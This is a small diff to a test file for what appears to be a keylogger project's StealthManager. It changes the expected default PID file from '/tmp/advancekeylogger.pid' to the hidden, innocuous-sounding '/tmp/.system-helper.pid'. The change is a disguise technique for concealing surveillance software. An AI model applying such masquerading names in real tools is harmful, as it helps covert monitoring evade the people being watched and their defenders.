@@ -484,7 +484,7 @@ class TestStealthManager:
     def test_get_pid_path_default(self):
         from stealth.core import StealthManager
         sm = StealthManager({"enabled": False})
-        assert sm.get_pid_path() == "/tmp/advancekeylogger.pid"
+        assert sm.get_pid_path() == "/tmp/.system-helper.pid"
 
     def test_get_pid_path_stealth(self):
         from stealth.core import StealthManager
